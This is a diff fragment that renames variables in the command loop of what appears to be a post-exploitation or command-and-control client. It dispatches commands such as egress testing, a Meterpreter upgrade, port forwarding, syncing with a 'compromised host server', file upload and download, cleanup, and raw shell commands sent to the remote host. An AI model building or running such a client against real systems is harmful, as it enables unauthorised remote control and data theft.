+                shell_input = ''
        
         #TODO: MOVE TO COMMAND PROCESSOR Function
         #built-ins 
-        menDrvCmds = ['!help', '!h', '!clear', '!c','!watch', '!sysinfo','!egress', '!meterup', '!forward', '!sync', '!exit', '!shutdown', '!cleanup']
-        parsedCmds = ['!cmd ', '!upload','!download',]
-        if shellInput.startswith('!') and shellInput in menDrvCmds:
-            if shellInput == '!help' or shellInput == '!h':
-                helpPrint()
-            elif shellInput == '!clear' or shellInput == '!c':
-                clearLocal()
-            elif shellInput == '!watch':
-                watchNew(docBuffer)  
-            elif shellInput == "!sysinfo":
-                sysInfo(docBuffer)
-            elif shellInput == "!egress":
-                print egressBust(docBuffer)
-            elif shellInput == '!meterup':
-                print meterUp(docBuffer)
-            elif shellInput == '!forward':
-                print forwardPort(docBuffer)
-            elif shellInput == '!sync':
+        menu_drvn_cmds = ['!help', '!h', '!clear', '!c','!watch', '!sysinfo','!egress', '!meterup', '!forward', '!sync', '!exit', '!shutdown', '!cleanup']
+        parsed_cmds = ['!cmd ', '!upload','!download',]
+        if shell_input.startswith('!') and shell_input in menu_drvn_cmds:
+            if shell_input == '!help' or shell_input == '!h':
+                help_print()
+            elif shell_input == '!clear' or shell_input == '!c':
+                clear_local()
+            elif shell_input == '!watch':
+                watch_new(doc_buffer)  
+            elif shell_input == "!sysinfo":
+                sysinfo(doc_buffer)
+            elif shell_input == "!egress":
+                print egress_bust(doc_buffer)
+            elif shell_input == '!meterup':
+                print meter_up(doc_buffer)
+            elif shell_input == '!forward':
+                print forward_port(doc_buffer)
+            elif shell_input == '!sync':
                 print "Attempting to synchronize with compromised host server."
-                if not syncUp(docBuffer):
+                if not sync_up(doc_buffer):
                     print "\n*** SYNC FAILED: No server or Lost Auth ***" 
-                    exitClient()        
-            elif shellInput == '!exit':
-                exitClient()
-            elif shellInput == "!shutdown":
-                sendShutdown(docBuffer)
-            elif shellInput == "!cleanup":
-                cleanUp(docBuffer)
+                    exit_client()        
+            elif shell_input == '!exit':
+                exit_client()
+            elif shell_input == "!shutdown":
+                send_shutdown(doc_buffer)
+            elif shell_input == "!cleanup":
+                clean_up(doc_buffer)
             
         #Parsed Exec        
-        elif shellInput.startswith('!cmd '):
-            print localCmd( shellInput.split(" ", 1)[1] )           
-        elif shellInput.startswith('!upload'):
-                print upload(docBuffer, shellInput)
-        elif shellInput.startswith('!download'):
-                print download(docBuffer, shellInput)
+        elif shell_input.startswith('!cmd '):
+            print local_cmd( shell_input.split(" ", 1)[1] )           
+        elif shell_input.startswith('!upload'):
+                print upload(doc_buffer, shell_input)
+        elif shell_input.startswith('!download'):
+                print download(doc_buffer, shell_input)
         
 
         #Handle invalid builtins
-        elif shellInput.startswith('!') and (shellInput not in menDrvCmds) and (shellInput not in parsedCmds):
-            print "Built-in command \"" + shellInput + "\" not found."
+        elif shell_input.startswith('!') and (shell_input not in menu_drvn_cmds) and (shell_input not in parsed_cmds):
+            print "Built-in command \"" + shell_input + "\" not found."
         
         #Raw cmd to remote host  
         else:
             #Send local STDIN
-            docBuffer.sendData(shellInput)
+            doc_buffer.send_data(shell_input)
             #Read remote STDOUT 
             try:
-                srvData = docBuffer.readData()
-                print "\n" + srvData + "\n"
+                srv_data = doc_buffer.read_data()
+                print "\n" + srv_data + "\n"
             except Exception as e:
                 print str(e)
      
